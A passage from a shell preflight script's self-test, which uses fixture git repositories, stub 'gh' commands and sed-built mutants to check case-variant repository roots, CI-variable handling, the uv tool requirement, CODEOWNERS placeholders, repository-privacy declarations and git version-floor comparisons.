          if [ -n "$_st_ci" ]; then echo "FAIL: mutant $1 is not observable here (this environment exits $_bk_adv under --boundary-advisory) and CI is set, so a weak result is a failure"; fail=1
          else echo "PASS: (weak) mutant $1 is not observable here (this environment exits $_bk_adv under --boundary-advisory)"; fi
        elif [ "$_bk_a" != "$5" ]; then echo "FAIL: mutant $1 scenario is vacuous (the original's bfail moves=$_bk_a, expected $5)"; fail=1
        elif [ "$_bk_b" = "$5" ]; then echo "FAIL: mutant $1 survived (bfail still moves=$_bk_b)"; fail=1
        else echo "PASS: mutant $1 is killed"; fi
      elif [ "$4" = rc ]; then   # the original exits $5; the mutant must exit something else
        _bnd_run "$_self" "$3"; _bk_ra=$_br_rc
        _bnd_run "$_bk/preflight.sh" "$3"; _bk_rb=$_br_rc
        if [ "$_bk_ra" -ne "$5" ]; then echo "FAIL: mutant $1 scenario is vacuous (the original exits $_bk_ra, expected $5)"; fail=1
        elif [ "$_bk_rb" -eq "$5" ]; then echo "FAIL: mutant $1 survived (it still exits $5)"; fail=1
        else echo "PASS: mutant $1 is killed (exit $_bk_rb, the original $_bk_ra)"; fi
      else
        _bnd_run "$_self" "$3"
        case "$_br_out" in
          *"$5"*) _bk_ok=1 ;;
          *) _bk_ok=0 ;;
        esac
        _bnd_run "$_bk/preflight.sh" "$3"
        case "$_br_out" in
          *boundary*|*egress*) _bk_ran=1 ;;
          *) _bk_ran=0 ;;
        esac
        case "$_br_out" in
          *"$5"*) _bk_still=1 ;;
          *) _bk_still=0 ;;
        esac
        if [ "$_bk_ok" -eq 0 ]; then echo "FAIL: mutant $1 scenario is vacuous (the original does not print '$5')"; fail=1
        elif [ "$_bk_ran" -eq 0 ]; then echo "FAIL: mutant $1 never ran the boundary block (vacuous)"; fail=1
        elif [ "$_bk_still" -eq 1 ]; then echo "FAIL: mutant $1 survived (it still prints '$5')"; fail=1
        else echo "PASS: mutant $1 is killed"; fi
      fi
      rm -rf "$_bk"
    }
  }
  # SWAS-358 / SWAS-468: a repository root entered through a case-variant spelling of its path (macOS is case-insensitive) is still its own root: owns_itself asks git
  # (`--show-prefix`), it does not compare path strings. The cell needs a case-insensitive filesystem, detected here; it is skipped, with the reason, on a case-sensitive one.
  # SWAS-487: self-contained. It builds its own minimal fixture (a bare origin and a work clone with one pushed commit and NO declaration, so an OFF part reads UNDECLARED),
  # uses only the names _cvog/_cv*, sets only the _g_* globals listed below (restored on the way out) and removes only its own fixture. The full selftest keeps using _og afterwards.
  st_case_variant() {
    _cvog=$(mktemp -d); _cvgx='-c user.name=kit -c user.email=kit@example.invalid -c commit.gpgsign=false -c core.hooksPath=/dev/null'
    git init -q --bare "$_cvog/origin.git"; git -C "$_cvog/origin.git" symbolic-ref HEAD refs/heads/main
    git init -q "$_cvog/work"; git -C "$_cvog/work" symbolic-ref HEAD refs/heads/main; git -C "$_cvog/work" remote add origin "$_cvog/origin.git"
    printf 'x\n' > "$_cvog/work/f"; printf 'Engineering Principles & Definition of Done\n' > "$_cvog/work/CLAUDE.md"; git -C "$_cvog/work" add f CLAUDE.md   # SWAS-784: an export-shaped root, or the real body refuses the fixture as no project
    # shellcheck disable=SC2086  # $_cvgx is a fixed flag list
    git -C "$_cvog/work" $_cvgx commit -q -m base; git -C "$_cvog/work" push -q origin main 2>/dev/null
    _cvs_proj=$_g_proj; _cvs_user=$_g_user; _cvs_decl=$_g_decl; _cvs_env=$_g_env; _cvs_ci=$_g_ci; _cvs_dir=$_g_dir
    _g_proj="$_bnd/off.json"; _g_user=""; _g_decl=real; _g_env=""; _g_ci=""
    _cv=$(printf '%s' "$_cvog/work" | tr 'a-z' 'A-Z')
    if [ "$_cv" != "$_cvog/work" ] && [ -d "$_cv" ]; then
      if ( CDPATH='' cd "$_cv" && owns_itself "$PWD" ); then echo "PASS: owns_itself [case-variant-cd] a repository root entered through a case-variant path is its own root"; else echo "FAIL: owns_itself [case-variant-cd] a case-variant path to the repository root was refused"; fail=1; fi
      _g_dir="$_cv"
      # SWAS-468: the mutant below is killable only if the `sh` it runs under KEEPS the case-variant spelling through `cd` + `pwd -P` (bash does; dash resolves to the stored
      # spelling, which makes the string compare equivalent). Probe that shell instead of assuming it, and say so loudly: a SKIP line, never a PASS.
      # Both spellings are resolved by the SAME probe shell (like with like), and an empty answer never counts as "equal": a probe that printed nothing runs the kill.
      _cvo=$(sh -c 'cd "$1" && pwd -P; cd "$2" && pwd -P' _ "$_cv" "$_cvog/work" 2>/dev/null) || _cvo=""   # MUT-CVPROBE
      _cvp=$(printf '%s\n' "$_cvo" | sed -n 1p); _cvc=$(printf '%s\n' "$_cvo" | sed -n 2p)
      if [ -n "$_cvp" ] && [ "$_cvp" = "$_cvc" ]; then   # MUT-CVSKIP
        # Counted and NOTEd at the end, but NOT gated under CI, unlike this file's other weak results: gating would turn a macOS CI whose sh is dash falsely red (SWAS-485),
        # and Linux CI never reaches this branch (the cell runs only on a case-insensitive filesystem).
        _pf_skips=$((${_pf_skips:-0} + 1))
        echo "SKIP owns-itself-string-compare: this sh canonicalises case-variant pwd -P (dash); coverage WEAK here"
      else
        _bnd_kill owns-itself-string-compare '/MUT-OWNSROOT/s/\[ -z "\$_pfx" \]/[ "\$_own" = "\$_phys" ]/' "--boundary-only --boundary-advisory" has 'OFF and UNDECLARED'   # the fixture's origin holds no declaration, so a part that is OFF reads UNDECLARED in the original and UNVERIFIED (not the root) in the mutant
      fi
    else
      echo "SKIP: owns_itself [case-variant-cd] this filesystem is case-sensitive (the upper-case spelling of the temp path does not resolve), so a case-variant path cannot reach the repository"
    fi
    _g_proj=$_cvs_proj; _g_user=$_cvs_user; _g_decl=$_cvs_decl; _g_env=$_cvs_env; _g_ci=$_cvs_ci; _g_dir=$_cvs_dir
    rm -rf "$_cvog"
  }
  if [ -n "$SELFTEST_CELL" ]; then   # --selftest-cell: the one named cell alone, then the cell's own trailer (never the full selftest's, see below)
    st_bnd_setup; st_case_variant   # MUT-CVSEL
    rm -rf "$_bnd"
    [ "${_pf_skips:-0}" -eq 0 ] || echo "NOTE: preflight selftest: ${_pf_skips} SKIP (coverage WEAK)"
    # The trailer must NOT be the line the full selftest ends with: a consumer that greps the full selftest's trailer must not read this cell's output as a full run (SWAS-487); keep it distinct.
    [ "$fail" -eq 0 ] && { echo "OK: preflight cell case-variant (not the full selftest)"; exit 0; } || { echo "FAIL: preflight cell case-variant"; exit 1; }   # MUT-CVTRAILER
  fi
  # SWAS-784: the real body now classifies the tree it runs in (project_root_class), and the selftest's own cwd is the kit checkout, which reads `kit` and earns no
  # all-clear. So a real-body call whose verdict needs the all-clear runs from _pr_xp, an export-shaped fixture (the principles CLAUDE.md, no kit marker, no repo, plus the
  # stack's .nvmrc the node-floor cells read). _pr_self is this script's absolute path, because those calls change directory first.
  _pr_self=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)/$(basename -- "$0")
  _pr_xp=$(mktemp -d); printf 'Engineering Principles & Definition of Done\n' > "$_pr_xp/CLAUDE.md"
  mkdir -p "$_pr_xp/profiles/typescript-node/scaffold"; printf '24\n' > "$_pr_xp/profiles/typescript-node/scaffold/.nvmrc"
  # The hermetic entry is load-bearing: the unscoped self-invocations below (kill-switch, git floor, node floor, go stack, sandbox) would otherwise run in CI mode on a runner
  # that exports CI (the sandbox cell's "cannot start" warning is skipped under CI). The check reads the line right after the selftest entry; a mutant that deletes it must go red.
  _hm_ok() {  # <script file>: rc 0 iff the first line of the selftest block unsets CI and GITHUB_ACTIONS
    _hm_l=$(sed -n '/^if \[ "\$SELFTEST" -eq 1 \]; then$/{n;p;}' "$1")
    case "$_hm_l" in
      "  _st_ci="*"; unset CI GITHUB_ACTIONS"*) return 0 ;;
    esac
    return 1
  }
  if _hm_ok "$0"; then echo "PASS: hermetic [entry-unset] the selftest unsets CI and GITHUB_ACTIONS at its entry"; else echo "FAIL: hermetic [entry-unset] the selftest does not unset CI and GITHUB_ACTIONS first"; fail=1; fi
  _hm_m=$(mktemp -d); sed '/MUT-HERMETIC/d' "$0" > "$_hm_m/preflight.sh"
  if cmp -s "$0" "$_hm_m/preflight.sh"; then echo "FAIL: mutant hermetic-unset-deleted did not apply"; fail=1
  elif _hm_ok "$_hm_m/preflight.sh"; then echo "FAIL: mutant hermetic-unset-deleted survived"; fail=1
  else echo "PASS: mutant hermetic-unset-deleted is killed"; fi
  rm -rf "$_hm_m"
  # S34: after the hermetic unset the runner's CI is gone, so every "weak result is a failure under CI" branch must read the value captured before it ($_st_ci). The check reads the
  # selftest block (minus the capture line): it must name CI by its expansion nowhere and read $_st_ci in at least six branches.
  _stci_ok() {  # <script file>: rc 0 iff the selftest block reads the captured CI and never the live one
    _stci_p='$''{CI:-}'
    _stci_body=$(sed -n '/^if \[ "\$SELFTEST" -eq 1 \]; then$/,$p' "$1" | grep -v '_st_ci=')
    case "$_stci_body" in
      *"$_stci_p"*) return 1 ;;
    esac
    [ "$(printf '%s\n' "$_stci_body" | grep -c '\[ -n "\$_st_ci" \]')" -ge 6 ]
  }
  if _stci_ok "$0"; then echo "PASS: s34 [weak-fails-under-captured-ci] the six weak-result branches read the CI captured before the hermetic unset"; else echo "FAIL: s34 [weak-fails-under-captured-ci] a weak-result branch reads the live (unset) CI or fewer than six read the captured one"; fail=1; fi
  _hm_m=$(mktemp -d); sed "/e2e-drops-advisory is not observable here and CI is set/s/\"\\\$_st_ci\"/\"$_stci_p\"/" "$0" > "$_hm_m/preflight.sh"
  if cmp -s "$0" "$_hm_m/preflight.sh"; then echo "FAIL: mutant weak-reads-live-ci did not apply"; fail=1
  elif _stci_ok "$_hm_m/preflight.sh"; then echo "FAIL: mutant weak-reads-live-ci survived"; fail=1
  else echo "PASS: mutant weak-reads-live-ci is killed (a branch that reads the unset CI again turns s34 red)"; fi
  rm -rf "$_hm_m"
  if command -v kit_definitely_absent_tool_xyz >/dev/null 2>&1; then
    echo "FAIL: sentinel tool unexpectedly exists"; fail=1
  else
    echo "PASS: absent tool detected as missing"
  fi
  if command -v sh >/dev/null 2>&1; then echo "PASS: present tool (sh) detected"; else echo "FAIL: sh not detected"; fail=1; fi
  if stack_tools __nope__ >/dev/null 2>&1; then echo "FAIL: unknown stack not handled"; fail=1; else echo "PASS: unknown stack handled gracefully"; fi
  if stack_tools python >/dev/null 2>&1; then echo "PASS: known stack mapped"; else echo "FAIL: known stack not mapped"; fail=1; fi
  # SWAS-786: python, ml and data-engineering name uv as their deps tool and run every standard command through it, so each stack's row carries a `uv|` line
  # (a `need`, so a machine without uv fails preflight with an install hint, not at its first `uv run pytest`).
  _uv_has() {  # <stack_tools output> -> rc 0 iff it carries the uv row
    case "$1" in *"uv|docs.astral.sh/uv"*) return 0 ;; esac
    return 1
  }
  for _uv_s in python ml data-engineering; do
    if _uv_has "$(stack_tools "$_uv_s" 2>/dev/null)"; then echo "PASS: swas-786 [$_uv_s] stack_tools prints the uv row"; else echo "FAIL: swas-786 [$_uv_s] stack_tools has no uv row"; fail=1; fi
  done
  # mutant uv-row-dropped: a temp copy of this script without the uv row; its stack_tools (extracted and evaluated in a subshell) must lose the row, or the cell above proves nothing.
  _uv_m=$(mktemp -d); sed 's#\\nuv|docs.astral.sh/uv##' "$0" > "$_uv_m/preflight.sh"
  if cmp -s "$0" "$_uv_m/preflight.sh"; then echo "FAIL: mutant uv-row-dropped did not apply (the sed expression matched nothing)"; fail=1
  else
    _uv_mo=$( eval "$(sed -n '/^stack_tools() {/,/^}/p' "$_uv_m/preflight.sh")"; stack_tools python 2>/dev/null ) || _uv_mo=""
    case "$_uv_mo" in
      "") echo "FAIL: mutant uv-row-dropped printed no stack_tools output (vacuous)"; fail=1 ;;
      *) if _uv_has "$_uv_mo"; then echo "FAIL: mutant uv-row-dropped survived (the row is still there)"; fail=1; else echo "PASS: mutant uv-row-dropped is killed"; fi ;;
    esac
  fi
  # the real body on a PATH with no uv prints `MISS uv` and exits non-zero. The shim directory holds a symlink to every executable the real PATH offers EXCEPT uv, so every other
  # tool the body calls still resolves; the cell first proves `command -v uv` fails there (else it would be vacuous). /bin/sh runs the body by absolute path, from the export-shaped
  # fixture (SWAS-784), with the seams live and the boundary advisory.
  _uv_b="$_uv_m/bin"; mkdir -p "$_uv_b"
  _uv_oifs=$IFS; IFS=:
  for _uv_d in $PATH; do
    [ -d "$_uv_d" ] || continue
    ls -1A "$_uv_d" 2>/dev/null | while IFS= read -r _uv_n; do
      [ "$_uv_n" = uv ] && continue
      [ -x "$_uv_d/$_uv_n" ] && [ ! -d "$_uv_d/$_uv_n" ] && [ ! -e "$_uv_b/$_uv_n" ] && ln -s "$_uv_d/$_uv_n" "$_uv_b/$_uv_n" 2>/dev/null || :
    done
  done
  IFS=$_uv_oifs
  _uv_run() {  # <script> -> _uv_out, _uv_rc : the real body for --stack python on the uv-less PATH
    _uv_rc=0
    _uv_out=$(cd "$_pr_xp" && env -u CI -u GITHUB_ACTIONS PATH="$_uv_b" PREFLIGHT_GH_CMD=false ACTIONLINT_VALID_CMD=__skip__ /bin/sh "$1" --selftest-e2e --boundary-advisory --stack python 2>&1 </dev/null) || _uv_rc=$?
  }
  if env PATH="$_uv_b" /bin/sh -c 'command -v uv' >/dev/null 2>&1; then
    echo "FAIL: swas-786 the shim PATH still resolves uv, so the MISS uv cell below would be vacuous"; fail=1
  else
    _uv_run "$_pr_self"
    case "$_uv_out" in *"Universal prerequisites:"*) _uv_live=1 ;; *) _uv_live=0 ;; esac
    if [ "$_uv_live" -eq 0 ]; then echo "FAIL: swas-786 the real body never ran on the uv-less PATH (vacuous): $_uv_out"; fail=1
    elif [ "$_uv_rc" -ne 0 ] && printf '%s\n' "$_uv_out" | grep -qF '  MISS uv — docs.astral.sh/uv'; then
      echo "PASS: swas-786 a real python run on a PATH with no uv prints 'MISS uv — docs.astral.sh/uv' and exits non-zero"
    else echo "FAIL: swas-786 a real python run on a PATH with no uv did not print MISS uv with a non-zero exit (rc $_uv_rc): $_uv_out"; fail=1; fi
    # mutant uv-row-dropped, end to end: the same run of the mutated copy must NOT print the line.
    cp "$(dirname -- "$0")/incept.sh" "$_uv_m/incept.sh"
    _uv_run "$_uv_m/preflight.sh"
    case "$_uv_out" in
      *"Universal prerequisites:"*)
        if printf '%s\n' "$_uv_out" | grep -qF '  MISS uv'; then echo "FAIL: mutant uv-row-dropped survived end to end (MISS uv still printed)"; fail=1; else echo "PASS: mutant uv-row-dropped is killed end to end (no MISS uv without the row)"; fi ;;
      *) echo "FAIL: mutant uv-row-dropped never ran the real body on the uv-less PATH (vacuous): $_uv_out"; fail=1 ;;
    esac
  fi
  rm -rf "$_uv_m"
  # incept's two sentences name BOTH causes and the right remedy: the cause line says a tool may be missing (not only below a floor), and the escape line says
  # --allow-runtime-mismatch waives only a version floor, never a missing tool (SWAS-807 reworded both sentences). A source lock, as the interactive refusal needs a terminal; each half has a mutant that restores the old text.
  _uv_ic="$(dirname -- "$0")/incept.sh"
  _uv_inc_ok() {  # <incept.sh> -> rc 0 iff both new sentences are in it
    grep -qF 'toolchain check failed: a required tool is missing or below its declared floor (run sh scripts/preflight.sh --stack' "$1" \
      && grep -qF 'echo "  install each tool preflight lists as MISS, and upgrade each one below its floor." >&2' "$1" \
      && grep -qF '"  (--allow-runtime-mismatch waives only a version floor; it installs nothing.)"' "$1" \
      && ! grep -qF 'To proceed anyway, accepting that the emitted project may not build, re-run with:' "$1"
  }
  if _uv_inc_ok "$_uv_ic"; then echo "PASS: swas-786 incept's cause line names a missing tool and its escape line says the flag never waives one"; else echo "FAIL: swas-786 incept's cause or escape line does not carry the new sentence"; fail=1; fi
  _uv_m=$(mktemp -d)
  for _uv_mut in \
    'cause-old|s/toolchain check failed: a required tool is missing or below its declared floor/toolchain does not meet its declared floor/' \
    'escape-old|s/install each tool preflight lists as MISS, and upgrade each one below its floor\./To proceed anyway, accepting that the emitted project may not build, re-run with:/;s/--allow-runtime-mismatch waives only a version floor; it installs nothing\./  --allow-runtime-mismatch/'; do
    sed "${_uv_mut#*|}" "$_uv_ic" > "$_uv_m/incept.sh"
    if cmp -s "$_uv_ic" "$_uv_m/incept.sh"; then echo "FAIL: mutant incept-${_uv_mut%%|*} did not apply (the sed expression matched nothing)"; fail=1
    elif _uv_inc_ok "$_uv_m/incept.sh"; then echo "FAIL: mutant incept-${_uv_mut%%|*} survived (the sentence check stayed green)"; fail=1
    else echo "PASS: mutant incept-${_uv_mut%%|*} is killed"; fi
  done
  rm -rf "$_uv_m"
  miss=0; recommend kit_definitely_absent_tool_xyz "x" >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: recommend warns without failing (miss untouched)"; else echo "FAIL: recommend set miss"; fail=1; fi

  # — S2: repo-class check (PREFLIGHT_GH_CMD seam; SWAS-813: the KIT_ATTEST_PRIVATE declaration through the PREFLIGHT_GH_VAR_CMD seam) ————————————
  # _ra_mk <repo-answer> <org-answer>: a gh-api stand-in that answers the repository variable read and the organization list read from two snippets of shell.
  _ra_t=$(mktemp -d); _ra_404='echo "gh: Not Found (HTTP 404)" >&2; exit 1'; _ra_403='echo "gh: Resource not accessible (HTTP 403)" >&2; exit 1'
  _ra_org_true='printf "%s\n" "{\"total_count\":1,\"variables\":[{\"name\":\"KIT_ATTEST_PRIVATE\",\"value\":\"true\"}]}"'
  _ra_org_none='printf "%s\n" "{\"total_count\":0,\"variables\":[]}"'
  _ra_repo_true='printf "%s\n" "{\"name\":\"KIT_ATTEST_PRIVATE\",\"value\":\"true\"}"'
  _ra_repo_false='printf "%s\n" "{\"name\":\"KIT_ATTEST_PRIVATE\",\"value\":\"false\"}"'
  _ra_mk() { printf '%s\n' '#!/bin/sh' 'case "$1" in' "  */actions/variables/KIT_ATTEST_PRIVATE) $1 ;;" "  */actions/organization-variables) $2 ;;" 'esac' > "$_ra_t/stub.sh"; }
  _ra_priv='printf {"isPrivate":true,"isInOrganization":false}'
  _ra_privorg='printf {"isPrivate":true,"isInOrganization":true}'
  _ra_mk "$_ra_404" "$_ra_org_none"
  out=$(PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1)
  case "$out" in *warn*PRIVATE*KIT_ATTEST_PRIVATE*"dated na"*) echo "PASS: private repo without the declaration warns, naming KIT_ATTEST_PRIVATE and the na route (provenance skip)";; *) echo "FAIL: private repo without the declaration did not warn ($out)"; fail=1;; esac

  out=$(PREFLIGHT_GH_CMD='printf {"isPrivate":false,"isInOrganization":false}' check_repo_class 2>&1)
  case "$out" in *ok*) echo "PASS: public repo ok, no warn";; *) echo "FAIL: public repo not ok ($out)"; fail=1;; esac

  out=$(PREFLIGHT_GH_CMD="$_ra_privorg" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1)
  case "$out" in *warn*PRIVATE*) echo "PASS: org-owned private without the declaration warns (the owner type no longer passes the gate)";; *) echo "FAIL: org-owned private repo did not warn ($out)"; fail=1;; esac

  _ra_mk "$_ra_repo_true" "$_ra_org_none"
  out=$(PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1)
  case "$out" in *ok*declared*) echo "PASS: private repo with the repository variable true is ok";; *) echo "FAIL: declared private repo not ok ($out)"; fail=1;; esac

  _ra_mk "$_ra_404" "$_ra_org_true"
  out=$(PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1)
  case "$out" in *ok*declared*) echo "PASS: private repo with only the organization variable true is ok";; *) echo "FAIL: org-declared private repo not ok ($out)"; fail=1;; esac

  _ra_mk "$_ra_repo_false" "$_ra_org_true"
  out=$(PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1)
  case "$out" in *warn*PRIVATE*) echo "PASS: repository variable false beats organization variable true (the repository value decides)";; *) echo "FAIL: repository false did not decide ($out)"; fail=1;; esac

  _ra_mk "$_ra_403" "$_ra_org_true"
  out=$(PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1)
  case "$out" in *"skip repo-class"*"could not read"*) echo "PASS: a 403 on the variable read degrades to a skip line, never ok";; *) echo "FAIL: a 403 read was not a skip ($out)"; fail=1;; esac

  # the read seam is honoured only under SEAMS=1: with it off, a stand-in that would say declared is ignored and a failing gh on PATH decides (unverifiable)
  mkdir -p "$_ra_t/nogh"; printf '%s\n' '#!/bin/sh' 'echo "gh: Resource not accessible (HTTP 403)" >&2' 'exit 1' > "$_ra_t/nogh/gh"; chmod +x "$_ra_t/nogh/gh"
  _ra_mk "$_ra_repo_true" "$_ra_org_true"
  out=$( SEAMS=0; PATH="$_ra_t/nogh:$PATH"; PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1 )
  case "$out" in *declared*) echo "FAIL: PREFLIGHT_GH_VAR_CMD was honoured with SEAMS=0 ($out)"; fail=1;; *"skip repo-class"*) echo "PASS: PREFLIGHT_GH_VAR_CMD is ignored unless SEAMS=1";; *) echo "FAIL: SEAMS=0 cell printed neither the skip nor declared ($out)"; fail=1;; esac

  out=$(PREFLIGHT_GH_CMD='false' check_repo_class 2>&1)
  case "$out" in *skip*) echo "PASS: gh-failure degrades to skip";; *) echo "FAIL: gh-failure not skipped ($out)"; fail=1;; esac

  # WARN-only invariant: a warning must NOT set miss
  _ra_mk "$_ra_404" "$_ra_org_none"
  miss=0; PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: repo-class warn leaves miss untouched"; else echo "FAIL: repo-class warn set miss"; fail=1; fi

  # mutant attest-state-dropped: the declaration is no longer read (the answer is forced to declared), so the private cell with both reads absent must stop warning.
  _ra_mut=$(sed '/# MUT-ATTEST$/s/.*/    _ra=declared/' "$0" | sed -n '/^check_repo_class() {/,/^}/p')
  if [ -z "$_ra_mut" ] || [ "$_ra_mut" = "$(sed -n '/^check_repo_class() {/,/^}/p' "$0")" ]; then echo "FAIL: mutant attest-state-dropped did not apply (the sed expression matched nothing)"; fail=1
  else
    out=$( eval "$_ra_mut"; PREFLIGHT_GH_CMD="$_ra_priv" PREFLIGHT_GH_VAR_CMD="sh $_ra_t/stub.sh" check_repo_class 2>&1 )
    case "$out" in *warn*) echo "FAIL: mutant attest-state-dropped survived (the private cell still warns)"; fail=1;; *ok*) echo "PASS: mutant attest-state-dropped is killed (the private cell stops warning)";; *) echo "FAIL: mutant attest-state-dropped never ran the repo-class check (vacuous: $out)"; fail=1;; esac
  fi
  rm -rf "$_ra_t"

  # — S2: CODEOWNERS placeholder check ————————————————————————————————————————
  _t=$(mktemp -d)
  printf '* @your-org/team\n' > "$_t/CODEOWNERS"
  out=$(CODEOWNERS_PATHS="$_t/CODEOWNERS" check_codeowners_placeholders 2>&1)
  case "$out" in *warn*your-org*) echo "PASS: @your-org placeholder warns";; *) echo "FAIL: placeholder not warned ($out)"; fail=1;; esac
  printf '* @real-team\n' > "$_t/CODEOWNERS"
  out=$(CODEOWNERS_PATHS="$_t/CODEOWNERS" check_codeowners_placeholders 2>&1)
  case "$out" in *ok*) echo "PASS: clean CODEOWNERS ok";; *) echo "FAIL: clean CODEOWNERS not ok ($out)"; fail=1;; esac
  out=$(CODEOWNERS_PATHS="$_t/none" check_codeowners_placeholders 2>&1)
  if [ -z "$out" ]; then echo "PASS: absent CODEOWNERS is N/A (no line)"; else echo "FAIL: absent CODEOWNERS printed ($out)"; fail=1; fi
  miss=0; printf '* @your-org/team\n' > "$_t/CODEOWNERS"; CODEOWNERS_PATHS="$_t/CODEOWNERS" check_codeowners_placeholders >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: codeowners warn leaves miss untouched"; else echo "FAIL: codeowners warn set miss"; fail=1; fi
  rm -rf "$_t"

  # — S2: workflow-validity check (delegates to actionlint-valid.sh) ——————————
  out=$(ACTIONLINT_VALID_CMD='true' check_workflows_valid 2>&1)
  case "$out" in *ok*workflows*) echo "PASS: valid workflows ok";; *) echo "FAIL: valid workflows not ok ($out)"; fail=1;; esac
  out=$(ACTIONLINT_VALID_CMD='false' check_workflows_valid 2>&1)
  case "$out" in *warn*workflow*) echo "PASS: invalid workflow warns (pointer to actionlint-valid)";; *) echo "FAIL: invalid workflow not warned ($out)"; fail=1;; esac
  out=$(ACTIONLINT_VALID_CMD='__skip__' check_workflows_valid 2>&1)
  case "$out" in *skip*) echo "PASS: unavailable check degrades to skip";; *) echo "FAIL: unavailable check not skipped ($out)"; fail=1;; esac
  miss=0; ACTIONLINT_VALID_CMD='false' check_workflows_valid >/dev/null 2>&1
  if [ "$miss" -eq 0 ]; then echo "PASS: workflow warn leaves miss untouched"; else echo "FAIL: workflow warn set miss"; fail=1; fi

  # — SWAS-793: rec is a COUNT of advisory lines, not a flag. Two advisory sites run in THIS shell (a $( ) would lose rec): a user-owned PRIVATE repo and an @your-org CODEOWNERS.
  # rec is reset first because the cells above raised it in subshells or never read it. Red when every site sets rec=1: the two sites then read 1, not 2.
  _rc2_d=$(mktemp -d); printf '* @your-org/team\n' > "$_rc2_d/CODEOWNERS"
  # SWAS-813: the PRIVATE-repo site now reads the KIT_ATTEST_PRIVATE declaration; this stand-in answers 404 for the repository variable and an empty organization list (absent), so the site warns.
  printf '%s\n' '#!/bin/sh' 'case "$1" in' '  */actions/variables/KIT_ATTEST_PRIVATE) echo "gh: Not Found (HTTP 404)" >&2; exit 1 ;;' '  */actions/organization-variables) printf "%s\n" "{\"total_count\":0,\"variables\":[]}" ;;' 'esac' > "$_rc2_d/stub.sh"
  _rc2_two() {  # -> _rc2_n: rec after the two advisory sites. CODEOWNERS runs FIRST and the PRIVATE-repo site LAST, so a site that goes back to rec=1 resets the count and the run reads 1, not 2.
    # The three seam variables are saved and restored (an inherited value comes back, an unset one stays unset), so nothing leaks into a later cell.
    _rc2_sg=${PREFLIGHT_GH_CMD-__unset__}; _rc2_sc=${CODEOWNERS_PATHS-__unset__}; _rc2_sv=${PREFLIGHT_GH_VAR_CMD-__unset__}
    rec=0
    CODEOWNERS_PATHS="$_rc2_d/CODEOWNERS"; check_codeowners_placeholders >/dev/null 2>&1
    PREFLIGHT_GH_CMD='printf {"isPrivate":true,"isInOrganization":false}'; PREFLIGHT_GH_VAR_CMD="sh $_rc2_d/stub.sh"; check_repo_class >/dev/null 2>&1
    if [ "$_rc2_sv" = __unset__ ]; then unset PREFLIGHT_GH_VAR_CMD; else PREFLIGHT_GH_VAR_CMD=$_rc2_sv; fi
    if [ "$_rc2_sg" = __unset__ ]; then unset PREFLIGHT_GH_CMD; else PREFLIGHT_GH_CMD=$_rc2_sg; fi
    if [ "$_rc2_sc" = __unset__ ]; then unset CODEOWNERS_PATHS; else CODEOWNERS_PATHS=$_rc2_sc; fi
    _rc2_n=$rec; rec=0
  }
  _rc2_two
  if [ "$_rc2_n" -eq 2 ]; then echo "PASS: swas-793 [rec-counts] two advisory sites in one run make rec 2, not a flag at 1"; else echo "FAIL: swas-793 [rec-counts] two advisory sites made rec $_rc2_n, expected 2"; fail=1; fi
  # mutant rec-flag-restored: the PRIVATE-repo site goes back to rec=1 (the extracted check_repo_class of a mutated copy replaces the live one in a subshell); the same two-site run must then read 1.
  _rc2_m=$(mktemp -d); sed '/# MUT-RECCOUNT$/s/rec=\$((rec + 1))/rec=1/' "$0" > "$_rc2_m/preflight.sh"
  if cmp -s "$0" "$_rc2_m/preflight.sh"; then echo "FAIL: mutant rec-flag-restored did not apply (the sed expression matched nothing)"; fail=1
  elif ! sh -n "$_rc2_m/preflight.sh" 2>/dev/null; then echo "FAIL: mutant rec-flag-restored does not parse (a mutant that cannot run would read as killed)"; fail=1
  else
    _rc2_mo=$( eval "$(sed -n '/^check_repo_class() {/,/^}/p' "$_rc2_m/preflight.sh")"; _rc2_two; printf '%s' "$_rc2_n" ) || _rc2_mo=""
    case "$_rc2_mo" in
      1) echo "PASS: mutant rec-flag-restored is killed (the two sites read 1)" ;;
      2) echo "FAIL: mutant rec-flag-restored survived (the two sites still read 2)"; fail=1 ;;
      *) echo "FAIL: mutant rec-flag-restored never ran the two-site run (vacuous: '$_rc2_mo')"; fail=1 ;;
    esac
  fi
  rm -rf "$_rc2_m" "$_rc2_d"

  # — T2: git version floor + `git merge-tree --write-tree` capability ————————————————
  # The floor exists because kit-update prefers `git merge-tree --write-tree` (git >= 2.38, 2022).
  # Ubuntu 20.04 ships git 2.25. DETECT AND DEGRADE: warn (never hard-fail) and NAME the escape.

  # THE NUMERIC-COMPARE PROOF (the whole reason this task exists): as strings "2.9" > "2.38".
  # Numerically 2.9 < 2.38. A string-naive floor would wave 2.9 through and be decorative.
  if git_meets_floor 2 38 2>/dev/null; then echo "PASS: 2.38 meets the 2.38 floor (boundary, inclusive)"; else echo "FAIL: 2.38 rejected by its own floor"; fail=1; fi
  if git_meets_floor 2 9 2>/dev/null; then echo "FAIL: 2.9 accepted — STRING-NAIVE compare ('2.9' > '2.38' lexically)"; fail=1; else echo "PASS: 2.9 rejected (numeric compare: 9 < 38)"; fi
  if git_meets_floor 2 39 2>/dev/null; then echo "PASS: 2.39 meets the floor"; else echo "FAIL: 2.39 rejected"; fail=1; fi
  if git_meets_floor 1 99 2>/dev/null; then echo "FAIL: 1.99 accepted (major below floor)"; fail=1; else echo "PASS: 1.99 rejected (major 1 < 2)"; fi
